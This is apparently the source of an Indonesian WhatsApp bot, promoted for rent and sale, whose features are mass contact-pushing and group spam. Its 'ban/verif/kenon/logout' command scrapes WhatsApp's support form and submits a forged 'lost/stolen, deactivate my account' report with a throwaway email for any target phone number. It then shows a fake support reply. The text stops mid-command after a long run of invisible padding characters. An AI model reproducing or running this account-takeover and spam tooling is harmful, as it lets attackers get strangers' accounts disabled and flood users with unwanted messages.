// SCRIPT BY OhhMyYinzz妥
// BASE BY OhhMyYinzz妥
// MINIMAL KALO REUPLOAD KASIH CREDITS GUA HARGAILAH YANG MEMBUAT SCRIPT INI DENGAN SUSAH PAYAH
// INI SCRIPT JANGAN DIJUAL KETAHUAN DIJUAL SIAP" AJA
// YOUTUBE SAYA https://www.youtube.com/OhhMyYinzz_
// CREDITS SCRIPT BOT WHATSAPP BY OhhMyYinzz妥

const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, fs, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { database } = require('./database/database')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const owner = JSON.parse(fs.readFileSync('./database/userAkses.json').toString())
const setting = JSON.parse(fs.readFileSync('./database/config.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.prefa = ['','.']

module.exports = yinzzofc = async (yinzzofc, msg, chatUpdate, store) => {
try {
const body = (msg.mtype === 'conversation') ? msg.message.conversation : (msg.mtype == 'imageMessage') ? msg.message.imageMessage.caption : (msg.mtype == 'videoMessage') ? msg.message.videoMessage.caption : (msg.mtype == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (msg.mtype == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.mtype == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.mtype == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (msg.mtype === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''
const budy = (typeof msg.text == 'string' ? msg.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const content = JSON.stringify(msg.message)
const { type, quotedMsg, mentioned, now, fromMe } = msg
const isCmd = body.startsWith(prefix)
const from = msg.key.remoteJid

const isGroup = msg.chat.endsWith('@g.us')
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = msg.pushName || "No Name"
const botNumber = await yinzzofc.decodeJid(yinzzofc.user.id)
const groupMetadata = msg.isGroup ? await yinzzofc.groupMetadata(msg.chat).catch(e => {}) : ''
const participants = msg.isGroup ? await groupMetadata.participants : ''

const groupName = msg.isGroup ? groupMetadata.subject : ''
const groupAdmins = msg.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = msg.isGroup ? groupMetadata.owner : ''
const groupMembers = msg.isGroup ? groupMetadata.participants : ''
const isBotAdmins = msg.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false
const isAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false

const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const itsMeyinzzofc = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
const itsMe = msg.sender == botNumber ? true : false
const text = q = args.join(" ")
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
const quoted = msg.quoted ? msg.quoted : msg
const mime = (quoted.msg || quoted).mimetype || ''
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
const isMedia = /image|video|sticker|audio/.test(mime)

try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[msg.sender]
if (typeof user !== 'object') global.db.users[msg.sender] = {}
const chats = global.db.chats[msg.chat]
if (typeof chats !== 'object') global.db.chats[msg.chat] = {}
} catch (err) {
console.error(err)
}

if (!yinzzofc.public) {
if (!msg.key.fromMe) return
}

if (!msg.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (msg.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (msg.sender.startsWith('212')) return yinzzofc.updateBlockStatus(msg.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${database}`, 
"jpegThumbnail": ppnyauser
}
}
}

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = yinzzofc.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
} else {
let res = yinzzofc.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
            + 'VERSION:3.0\n' 
            + 'FN:OhhMyYinzz妥\n' // full name
            + 'ORG:ADMIN;\n' // the organization of the contact
            + 'TEL;type=CELL;type=VOICE;waid=6281254698296:+62 812 5469 8296\n' // WhatsApp ID + phone number
            + 'END:VCARD'
             prit = [
                {buttonId: 'daftar', buttonText: {displayText: 'DAFTAR RESELLER'}, type: 2}
              ]
              
               pritprit = {
                  text: 'sepertinya kamu bukan Creatorku',
                  footer: '© OhhMyYinzz妥',
                  buttons: prit,
                  headerType: 1
              }

let fakenya = {key : {participant : '0@s.whatsapp.net', ...(msg.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `OhhMyYinzz妥`, jpegThumbnail: fs.readFileSync('./lib/logo.jpg')}}}

switch (command) {


case 'menu':{
let ownerNya = setting.ownerNumber
menu =`═════[ 𝑶𝒉𝒉𝑴𝒚𝒚𝒊𝒏𝒛𝒛妥 ]═════

${ucapanWaktu} Kak @${sender.split('@')[0]}

╔═══《 𝑩𝑶𝑻 𝑰𝑵𝑭𝑶 》════
╠❏ ᴄʀᴇᴀᴛᴏʀ : @${ownerNya.split('@')[0]}
╠❏ ʙᴏᴛ ɴᴀᴍᴇ : ${setting.botName}
╠❏ ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${setting.ownerName}
╠❏ ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟ ᴏɴʟʏ
╠❏ ᴘʀᴇғɪx : ( ᴍᴜʟᴛɪ ᴘʀᴇғɪx )
╚════════════════
╔════《 𝑴𝑬𝑵𝑼 𝑼𝑻𝑨𝑴𝑨 》════⊱
╠〉${prefix}pushkontak📍
╠〉${prefix}pushkontakv2📍
╠〉${prefix}cekmember📍
╠〉${prefix}cekidgroup📍
╠〉${prefix}creategc📍
╠〉${prefix}idgroup📍
╠〉${prefix}donasi📍
╠〉${prefix}script📍
╠〉${prefix}owner📍
╠〉${prefix}rulesbot📍
╠〉${prefix}public📍
╠〉${prefix}self📍
╠〉${prefix}join📍
╠〉${prefix}ping📍
╠〉${prefix}jpm📍
╠〉${prefix}tqto📍
╚════════════════
╔════《 𝑴𝑬𝑵𝑼 𝑮𝑹𝑶𝑼𝑷 》════⊱
╠〉${prefix}grup📍
╠〉${prefix}lgc📍
╠〉${prefix}tagall📍
╠〉${prefix}out📍
╠〉${prefix}kick📍
╠〉${prefix}promote📍
╠〉${prefix}demote📍
╠〉${prefix}hidetag📍
╠〉${prefix}revoke📍
╚════════════════
╔════《 𝑴𝑬𝑵𝑼 𝑩𝑨𝑵𝑻𝑨𝑰 》════⊱
╠〉${prefix}ban 62xxxx📍
╠〉${prefix}verif 62xxxx📍
╠〉${prefix}kenon 62xxxx📍
╠〉${prefix}logout 62xxxx📍
╚════════════════
╔════《 𝑴𝑬𝑵𝑼 𝑺𝑻𝑶𝑹𝑬 》════⊱
╠〉${prefix}sewabot📍
╠〉${prefix}buyscpush📍
╚════════════════
╔════《 𝑫𝑨𝑻𝑬 》════⊱
╠〉Wit : ${wit} 🕚
╠〉Wib : ${wib} 🕣
╠〉Wita : ${wita} 🕤
╠〉Tanggal : ${tanggal} 🗓️
╚════════════════`
yinzzofc.sendMessage(msg.chat, {text: menu, mentions: [sender, ownerNya]}, {quoted: fakenya})
}
break
case 'owner':
   
    yinzzofc.sendMessage(
        from,
        { 
            contacts: { 
                displayName: 'Ini Adalah Contact Pembuat Bot Kak', 
                contacts: [{ vcard }] 
            }
        }
    )
    msg.reply(`Tu Nomor Owner Jangan Spam`)
break
case 'public': {
if (!isCreator) return msg.reply('Maaf kak fitur ini khusus creator bot')
yinzzofc.public = true
msg.reply('Sukse Change To Public')
}
break
case 'self': {
if (!isCreator) return msg.reply('Maaf kak fitur ini khusus creator bot')
msg.reply('Sukses Change To Self')
yinzzofc.public = false
}
break
case "idgroup": {
if (!isCreator) return msg.reply('Maaf kak fitur ini khusus creator bot')
msg.reply(`Sebentar Kak Lagi Ambil *IDGROUP*\nNote : Jika Delay Mohon Maaf`)
let getGroups = await yinzzofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP ANDA*\n\nTotal Group : ${anu.length} GROUP\n\n`
for (let x of anu) {
let metadata2 = await yinzzofc.groupMetadata(x)
teks += `❏ *INFO GROUP*\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
msg.reply(teks + `Untuk Penggunaan Silahkan Ketik\nCommand ${prefix}pushv2 id|teks\n\nCREATED BY *© OhhMyYinzz妥*`)
}
break
case 'cekidgroup':
            if (!isCreator && !msg.key.fromMe) return msg.reply('Maaf Kak Fitur Ini Hanya Dapat Digunakan Oleh Creator bot Saja!!')
                id = msg.key.remoteJid
                pengirim = msg.key.participant
                nama = msg.pushName
          

    await yinzzofc.sendMessage(from,{text: `${id}`},{quoted: msg})

            break 
case "cekmember": {
if (!isCreator) return msg.reply('Maaf kak fitur ini khusus creator bot')
if (!q) return msg.reply("Id Nya Mana Kak?")
let cekmd = await yinzzofc.groupMetadata(q)
let txrk = await yinzzofc.sendMessage(from, { text: `Nama Group : ${cekmd.subject}\nMember : ${cekmd.participants.length} Orang` }, { quoted: msg })
await yinzzofc.sendMessage(from, { text: `Jika Mau Push Kontak Gunakan Command Di Bawah\n${prefix}pushkontak ${q}|Hallo Save OhhMyYinzz妥\n\nCommand Di Atas Teks Nya Hanya Contoh Jadi Ubah Aja Yaa` }, { quoted: txrk })
}
break
case 'creategc':
case 'creategroup':
case 'buatgroup':
if (!isCreator) return msg.reply(`Maaf Kak Fitur Ini Khusus Creator Bot`)
if (!q) return msg.reply(`*Cara*\n${prefix+command} nama group\n\nContoh :\n${prefix+command} Grup Store`)
var nama_nya = q
let cret = await yinzzofc.groupCreate(nama_nya, [])
let response = await yinzzofc.groupInviteCode(cret.id)
var teks_creategc = `「 *Succes Create Group* 」
_*Name :* ${cret.subject}_ 📛
_*Owner :* @${cret.owner.split("@")[0]}_ 🤴
_*Tanggal :* ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY")}_ 📅
_*Jam :* ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("HH:mm:ss")} WIB_ ⏰

*LINK GROUP* :
https://chat.whatsapp.com/${response}`
msg.reply(teks_creategc)
break
case 'donasi':{
donasi = `
  ●▬▬▬ஜ۩۞۩ஜ▬▬▬●
   ╰•★★  ɖơŋąʂı ★★•╯
   
   Semoga Yg Donasi Di Berikan 
      Rejeki Yang Berlimpah😊
    Silahkan Pilih Payment Nya 

DANA : https://telegra.ph/file/b0d24bc8335d8a2ab020c.jpg
ALLPAY : https://telegra.ph/file/92cba21734335c0c9cf3b.png
GOPAY : https://telegra.ph/file/2ecea87324cfe5977f246.jpg
PULSA : 081254698296`
msg.reply(donasi)
}
break
case 'tqto':{
let teks = `*-----------「 Thanks To 」-----------*
*- OhhMyYinzz妥 ( Base Dan Creator )*
*- AiHoshino-Botz🅥 ( Bot Punya OhhMyYinzz妥 )*
*- Adiwajshing ( Baileys )*`
msg.reply(teks)
}
break
case 'tutorbot':
case 'rulesbot':{
rulesbot = ` 
Jam Aktif BOT
(24Jam NonStop)

*CARA PAKAI BOT PUSHKONTAK*
- .push textlu  (FITUR INI KHUSUS DALAM GRUP)
- .pushv2 idgroup|textlu  (FITUR INI KHUSUS PRIVATE CHAT)
*SEKIAN TUTOR PAKAI MOGA PAHAM YA KAK*

_*Mohon Berikan Jeda Sampai BOT Sukses Menjalankan Perintah!!!*_
_*UTAMAKAN JANGAN SPAM BOT*_

_*Mohon Pengertiannya ya kak*_

_Ga Patuh? Tanggung Sendiri Akibatnya Ya Kak_
_Itu Aja Rulesnya Sekian Terima Kasih!!!_`
msg.reply(rulesbot)
}
break
case 'sewabot':{
sewabot = `Sewa Bot Pushkontak
7k / Minggu
12k / Bulan

keuntungan Sewabot Pushkontak
- bisa pushkontak sesukamu sampai jadi femes
- bisa menggunakan semua fitur yang disediakan dalam script bot
- bisa pushmember menggunakan fitur jpm
- bot sudah dilengkapi dengan fitur anti banned/kenon
- bot anti delay

*MAU SEWA? PM NO DIBAWAH YAK
http://wa.me/6281254698296?text=bang+mau+sewabot+pushkontaknya+dong`
msg.reply(sewabot)
}
break
case 'buyscpush': case 'script': case 'sc':{
let text_sc =`*Haloo Kak ${pushname}👋*\n`
text_sc += "*SCRIPT NO ENC*\n"
text_sc += "Mau beli scriptnya?\n\n"
text_sc += "*Contact Person 📞*\n"
text_sc += "https://wa.me/6281254698296\n\n"
text_sc += "*Pembayaran Via* 💳\n"
text_sc += "_Qris / Gopay / Dana_\n\n"
text_sc += "*Harga : Rp30.000 (30k)*\n"
text_sc += "*Harga terlalu mahal?*\n"
text_sc += "*Sans nego dikit gpp*\n\n"
text_sc += "Sudah termasuk tutorial.\n"
text_sc += "Size script sudah ringan.\n"
text_sc += "Anti ngelag/delay."
msg.reply(text_sc)
}
break
case 'ban': 
case 'verif': 
case 'kenon': 
case 'logout':  {
if (!isCreator) return msg.reply('Maaf Kak Fitur Ini Khusus Creator Bot')
if (msg.quoted || q) {
const froms = msg.quoted ? msg.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await yinzzofc.onWhatsApp(froms)
if (cekno.length == 0) return
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
msg.reply(`FROM WhatsApp Support
Hai,
 Terima kasih atas pesan Anda.
 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.
 Selama periode penonaktifan:
 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda. 
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke akun akan tetap dalam status tertunda hingga 30 hari.
 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai secepatnya.  
 Daftar ulang akun Anda dengan memasukkan kode 6 digit, kode yang Anda terima melalui SMS atau panggilan telepon. Jika Anda mendaftar ulang
 pulihkan riwayat obrolan Anda di: Android |  iPhone.
 file, cadangan, atau riwayat panggilan dari akun yang dihapus.
 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media
 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.
 Sumber daya terkait:
  Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.
  Pelajari tentang akun yang dicuri di artikel ini.
 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
msg.reply(`Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui Chat Whatsapp Anda dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else msg.reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else msg.reply('Masukkan nomor target!')
}
break
case "tagall": {
if (!isGroup) return msg.reply(`Maaf Kak Fitur Ini Hanya Bisa Digunakan Didalam Group`)
if (!isAdmins) return msg.reply(`Maaf Kak Fitur Ini Khusus Creator Dan Admin Grup Saja`)
if (!isBotAdmins) return msg.reply(`Aduhh Maaf Kak Botnya Belum Dijadikan Admin Nihh`)
if (!q) return msg.reply(`Teksnya Kak??`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎